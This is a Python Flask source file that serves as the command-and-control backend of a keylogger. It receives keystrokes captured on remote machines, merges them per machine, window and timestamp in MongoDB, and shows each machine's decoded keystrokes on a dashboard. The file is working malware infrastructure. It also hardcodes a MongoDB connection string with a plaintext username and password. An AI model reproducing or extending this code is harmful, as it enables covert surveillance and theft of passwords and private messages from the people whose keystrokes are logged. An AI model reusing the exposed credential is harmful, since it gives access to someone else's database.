from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from bson.json_util import dumps
import sys
import json
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from keylogger.keylogger import Encryptor

app = Flask(__name__, template_folder="static")
CORS(app)

# MONGO_URI = os.environ["MONGO_URI"]
MONGO_URI = "mongodb+srv://ishaicohen125:Aa12345@cluster0.z4ssc0b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI, server_api=ServerApi("1"))
db = client["key_logger"]
db_collection = db["KeyLogger"]
encryptor = Encryptor()

@app.route("/")
def home():
    computers = list(db_collection.find({}, {'_id': 0, "machine_name": 1}))
    return render_template("dashboard.html", computers=computers)

@app.route("/api/computers", methods=["GET", "POST"])
def get_computers():

    if request.method == "POST":
        new_data = request.get_json()

        if not new_data or "machine_name" not in new_data or "data" not in new_data:
            return jsonify({"error": "Invalid data format"}), 400

        existing_record = db_collection.find_one({"machine_name": new_data["machine_name"]})

        if existing_record:
            existing_record = json.loads(dumps(existing_record))

            merged_data = existing_record["data"].copy()
            for window in new_data["data"]:
                if window not in merged_data:
                    merged_data[window] = {}
                for time in new_data["data"][window]:
                    if time not in merged_data[window]:
                        merged_data[window][time] = ""
                    merged_data[window][time] += new_data["data"][window][time]

            db_collection.update_one(
                {"machine_name": new_data["machine_name"]},
                {"$set": {"data": merged_data}}
            )
        else:
            db_collection.insert_one(new_data)

        return jsonify({"message": "Data saved successfully"}), 201


    elif request.method == "GET":
        all_data = list(db_collection.find({}, {'_id': 0}))
        return jsonify(all_data), 200


@app.route("/api/computers/<computer>", methods=["GET"])
def get_computer(computer):
    try:
        computer_data = db_collection.find_one({"machine_name": computer}, {'_id': 0})
        if not computer_data:
            return jsonify({"error": "Computer not found!"}), 404
        return render_template("monitor.html", computer_data=encryptor.xor(computer_data["data"]))
    except Exception as e:
        return jsonify({"Error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True)
